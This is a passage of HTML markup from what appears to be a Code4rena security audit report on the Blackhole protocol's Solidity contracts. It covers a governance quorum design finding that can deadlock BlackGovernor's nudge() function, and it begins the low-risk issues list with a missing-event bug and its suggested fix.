class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// token.getPastTotalSupply() resolves to VotingEscrow.totalSupplyAtT(timestamp)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eQuorum\u003c/strong\u003e: Determined by \u003ccode\u003equorum()\u003c/code\u003e, which requires 4% of \u003ccode\u003etoken.getsmNFTPastTotalSupply()\u003c/code\u003e. This \u003ccode\u003egetsmNFTPastTotalSupply()\u003c/code\u003e resolves to \u003ccode\u003eVotingEscrow.smNFTBalance\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eVotingEscrow.smNFTBalance\u003c/code\u003e represents the cumulative sum of \u003cem\u003eprincipal \u003ccode\u003eBLACK\u003c/code\u003e tokens ever burned\u003c/em\u003e to create or upgrade to smNFTs. This \u003ccode\u003esmNFTBalance\u003c/code\u003e value only ever increases. The 4% of this principal amount is then used as the target for the \u003cem\u003etotal voting power\u003c/em\u003e that must be cast in favor of a proposal.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// contracts/BlackGovernor.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003equorum\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetsmNFTPastTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() * \u003c/span\u003e\u003cspan class=\"mtk11\"\u003equorumNumerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) / \u003c/span\u003e\u003cspan class=\"mtk11\"\u003equorumDenominator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// quorumNumerator is 4\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// token.getsmNFTPastTotalSupply() resolves to VotingEscrow.smNFTBalance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a situation where the ability to propose is based on overall \u003ccode\u003eveBLACK\u003c/code\u003e voting power distribution, but the ability for a proposal to pass (quorum) is heavily tied to a growing, historical sum of burned \u003ccode\u003eBLACK\u003c/code\u003e for smNFTs, which might not correlate with active smNFT voting participation or the total active voting power.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"risk-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#risk-and-impact-1\" aria-label=\"risk and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRisk and Impact\u003c/h3\u003e\n\u003cp\u003eThe primary risk is a \u003cstrong\u003eDenial of Service (DoS)\u003c/strong\u003e for the \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e function, which is the \u003cem\u003eonly\u003c/em\u003e function \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e can call.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance deadlock scenario (Medium risk)\u003c/strong\u003e: As the protocol matures, \u003ccode\u003eVotingEscrow.smNFTBalance\u003c/code\u003e (total \u003ccode\u003eBLACK\u003c/code\u003e principal burned for smNFTs) can grow significantly. If this balance becomes very large, the 4% quorum target (in terms of required voting power) can become unachievably high for the following reasons:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eActive smNFT holders might be a small fraction of the total \u003ccode\u003esmNFTBalance\u003c/code\u003e contributors (e.g., due to inactive early minters).\u003c/li\u003e\n\u003cli\u003eThe collective voting power of active smNFT holders who support a given proposal might be insufficient to meet this high quorum.\u003c/li\u003e\n\u003cli\u003eA user or group could meet the \u003ccode\u003eproposalThreshold()\u003c/code\u003e using voting power from regular \u003ccode\u003eveBLACK\u003c/code\u003e locks, but their proposal would consistently fail if the smNFT-derived quorum is not met by other voters. This leads to the \u003ccode\u003enudge()\u003c/code\u003e function becoming unusable, preventing any future adjustments to the tail emission rate via this governor.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGovernance spam\u003c/strong\u003e: A secondary consequence is the potential for governance “spam,” where proposals are repeatedly created meeting the threshold but are destined to fail due to the quorum structure, causing on-chain noise.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eContrast - low quorum scenario (Informational)\u003c/strong\u003e: Conversely, if \u003ccode\u003esmNFTBalance\u003c/code\u003e is very low (e.g., early in the protocol, or if smNFTs are unpopular), the quorum can be trivially met, potentially allowing a small group (that meets proposal threshold) to easily control the \u003ccode\u003enudge()\u003c/code\u003e function. This aspect was previously noted but provides context to the design’s sensitivity to \u003ccode\u003esmNFTBalance\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIllustrative deadlock scenario\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe \u003ccode\u003esmNFTBalance\u003c/code\u003e in \u003ccode\u003eVotingEscrow.sol\u003c/code\u003e has grown to a large number (e.g., 10,000,000 \u003ccode\u003eBLACK\u003c/code\u003e principal burned).\u003c/li\u003e\n\u003cli\u003eThe quorum target, in terms of voting power, becomes 4% of this, i.e., equivalent to the voting power derived from 400,000 \u003ccode\u003eBLACK\u003c/code\u003e (if it were all smNFTs with average lock/bonus).\u003c/li\u003e\n\u003cli\u003eA group of users (“Proposers”) accumulates 0.2% of the total \u003ccode\u003eveBLACK\u003c/code\u003e voting power (e.g., from a mix of regular and some smNFT locks) and creates a proposal to \u003ccode\u003enudge()\u003c/code\u003e emissions.\u003c/li\u003e\n\u003cli\u003eMany of the smNFTs contributing to the \u003ccode\u003esmNFTBalance\u003c/code\u003e were created by users who are now inactive or do not vote on this proposal.\u003c/li\u003e\n\u003cli\u003eThe active smNFT holders, plus the Proposers’ own smNFT voting power, sum up to less than the 400,000 \u003ccode\u003eBLACK\u003c/code\u003e equivalent voting power required for quorum.\u003c/li\u003e\n\u003cli\u003eThe proposal fails. This cycle can repeat, rendering the \u003ccode\u003enudge()\u003c/code\u003e function effectively disabled.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe current quorum mechanism presents a significant risk to the intended functionality of \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e. Consider the following:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAlign quorum base\u003c/strong\u003e: Modify the quorum calculation to be based on a metric more aligned with active participation or total voting power, similar to the \u003ccode\u003eproposalThreshold\u003c/code\u003e. For example, base the quorum on a percentage of \u003ccode\u003etoken.getPastTotalSupply(block.timestamp)\u003c/code\u003e (total \u003ccode\u003eveBLACK\u003c/code\u003e voting power).\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAdaptive quorum\u003c/strong\u003e: Implement an adaptive quorum mechanism. This could involve:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA quorum that adjusts based on recent voting participation in \u003ccode\u003eBlackGovernor\u003c/code\u003e proposals.\u003c/li\u003e\n\u003cli\u003eA system where the contribution of an smNFT to the \u003ccode\u003esmNFTBalance\u003c/code\u003e (for quorum calculation purposes, not its actual voting power) decays over time if the smNFT is inactive in governance.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDual quorum condition\u003c/strong\u003e: Consider requiring the lesser of two quorum conditions to be met: e.g., (4% of \u003ccode\u003esmNFTBalance\u003c/code\u003e-derived voting power) OR (X% of total \u003ccode\u003eveBLACK\u003c/code\u003e voting power). This provides a fallback if \u003ccode\u003esmNFTBalance\u003c/code\u003e becomes disproportionately large or inactive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDocumentation and monitoring\u003c/strong\u003e: If the current design is retained, thoroughly document the rationale and potential long-term implications. Continuously monitor \u003ccode\u003esmNFTBalance\u003c/code\u003e growth versus active smNFT voting participation and total \u003ccode\u003eveBLACK\u003c/code\u003e supply to assess if the \u003ccode\u003enudge()\u003c/code\u003e function’s viability is threatened.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 13 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-341\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003erayss\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-80\"\u003eChapo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-448\"\u003eGaurangBrdv\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-36\"\u003egolomp\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-1\"\u003eHarisuthan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-484\"\u003eIzuMan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-368\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-22\"\u003emihailvichev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-351\"\u003emnedelchev_\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-439\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-531\"\u003eSparrow\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-207\"\u003ezhanmingjing\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-191\"\u003eZZhelev\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eID\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003cth\u003eSeverity\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e[01]\u003c/td\u003e\n\u003ctd\u003eEarly returning in \u003ccode\u003e_blacklist()\u003c/code\u003e and \u003ccode\u003eblacklistConnector\u003c/code\u003e function prevents emission of blacklisted event and blacklistConnector event respectively\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[02]\u003c/td\u003e\n\u003ctd\u003eIncomplete implementation of \u003ccode\u003epurchased\u003c/code\u003e function in Auction contract\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[03]\u003c/td\u003e\n\u003ctd\u003eStack too deep error in inline assembly (variable \u003ccode\u003eheadStart\u003c/code\u003e)\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[04]\u003c/td\u003e\n\u003ctd\u003eHardcoded manager lacks ability to renounce control\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[05]\u003c/td\u003e\n\u003ctd\u003ePrecision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[06]\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003egetVotes()\u003c/code\u003e wiew function becomes unusable when a user owns too many locks\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[07]\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003edistributeAll()\u003c/code\u003e function at risk of repeated failure due to unbounded loop over gauges\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[08]\u003c/td\u003e\n\u003ctd\u003eFee recipient may remain set to previous owner\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[09]\u003c/td\u003e\n\u003ctd\u003eIncorrect \u003ccode\u003esetRouter\u003c/code\u003e function only allows zero address to pass\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[10]\u003c/td\u003e\n\u003ctd\u003eMisaligned access control on \u003ccode\u003esetTopNPools()\u003c/code\u003e function\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[11]\u003c/td\u003e\n\u003ctd\u003eGovernance/centralization Risks (21 contracts covered)\u003c/td\u003e\n\u003ctd\u003eGovernance\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[12]\u003c/td\u003e\n\u003ctd\u003eFunction declaration does not follow Solidity style guide at \u003ccode\u003eFixedAuction.sol\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNon-Critical\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[13]\u003c/td\u003e\n\u003ctd\u003eIncorrect require statement for address check at \u003ccode\u003eGaugeV2.sol\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNon-Critical\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues determined invalid by the judge have been removed from the final report.\u003c/em\u003e \u003c/p\u003e\n\u003ch2 id=\"01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively\" style=\"position:relative;\"\u003e\u003ca href=\"#01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively\" aria-label=\"01 early returning in _blacklist and blacklistconnector function prevents emission of blacklisted event and blacklistconnector event respectively permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Early returning in \u003ccode\u003e_blacklist()\u003c/code\u003e and \u003ccode\u003eblacklistConnector\u003c/code\u003e function prevents emission of blacklisted event and blacklistConnector event respectively\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/TokenHandler.sol#L83\"\u003eLink to the blacklist function\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/TokenHandler.sol#L131\"\u003eLink to the blacklistConnector function\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-13\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-13\" aria-label=\"finding description 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003e_blacklist\u003c/code\u003e function, a token is removed from the whitelist if it exists. However, the Blacklisted event — intended to log successful blacklist actions — is only emitted when the token is not found in the whiteListed array. Due to an early return statement inside the loop, the event is never emitted upon a successful removal, resulting in inconsistent logging and reduced transparency for off-chain indexers or UI components.\u003c/p\u003e\n\u003cp\u003eNOTE: The exact same issue lies in the \u003ccode\u003eblacklistConnector\u003c/code\u003e function, it returns early leading to the event not being emitted.\u003c/p\u003e\n\u003ch3 id=\"impact-13\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-13\" aria-label=\"impact 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSuccessful blacklist operations are not logged via events, reducing traceability.\u003c/li\u003e\n\u003cli\u003eSuccessfully removing a token from the list of connectors are not logged via events.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eMove the emit Blacklisted(…) statement inside the for-loop and place it before the return, to ensure the event is emitted only when the token is actually removed:\u003c/p\u003e\n\u003cp\u003eFor the \u003ccode\u003e_blacklist\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBlacklisted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit before return\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 